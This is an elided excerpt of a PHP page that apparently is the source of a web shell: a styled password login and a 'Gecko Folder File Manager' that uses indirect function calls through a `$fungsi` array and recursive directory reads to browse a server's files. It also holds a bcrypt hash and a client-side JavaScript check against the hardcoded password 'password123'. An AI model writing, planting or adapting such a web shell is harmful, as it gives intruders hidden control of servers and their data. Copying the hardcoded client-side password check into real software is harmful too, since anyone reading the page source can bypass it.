...
$hashed_password = '$2y$10$Q8Flwwa868Q8fXVj0stXKeS8pOcOeHcU7qWRaLB2QWcU7zFsUafAq';
...
.card {
    ...
    border: 2px solid rgba(49, 44, 44, 0.85);
    border-radius: 15px;
    padding: 30px;
    max-width: 400px;
    width: 100%;
...
h1 {
    color: rgba(5, 5, 5, 1);
    text-shadow: 0 0 10px rgba(5, 5, 5, 1);
    font-size: 2rem;
    text-align: center;
    margin-bottom: 1rem;
}
...
.btn-primary:hover {
    ...
    color: #000;
    box-shadow: inset 0 0 10px rgba(129, 129, 129, 1);
}
.alert {
    margin-top: 1rem;
    padding: 1rem;
...
<div class="card">
    ...
    <form method="POST">
        ...
        <input type="password" class="form-control" id="password" name="password" required style="letter-spacing:3px;">
        <button type="submit" class="btn btn-primary mt-3">WELCOME</button>
    </form>
</div>
...
form.addEventListener('submit', function(e) {
    e.preventDefault();
    if (passInput.value==='password123') {
        alert('Access granted! Welcome.');
        document.body.innerHTML = '<h1 style="color:rgba(5, 5, 5, 1);text-align:center; margin-top:50vh;">ACCESS GRANTED</h1>';
    } else {
...
?>
        ...
        <table style="width: 100%;"> 
            ...
            <form action="" method="post"> 
                <tbody> 
                    <!-- Gecko Folder File Manager --><?php foreach ($file_manager as $_D) : ?> 
                        <?php if ($fungsi[2]($_D)) : ?> 
                            <tr> 
    ...
    for ($i = 0;; $i++) { 
        ...
        if ($openDir = opendir($dir)) { 
            while ($readDir = @readdir($openDir)) { 
                if ($readDir != "." && $readDir != "..") {if ($GLOBALS['fungsi'][2]($dir . "/" . $readDir)) { 
                        $dirs[] = $dir . "/" . $readDir; 
                    } else { 
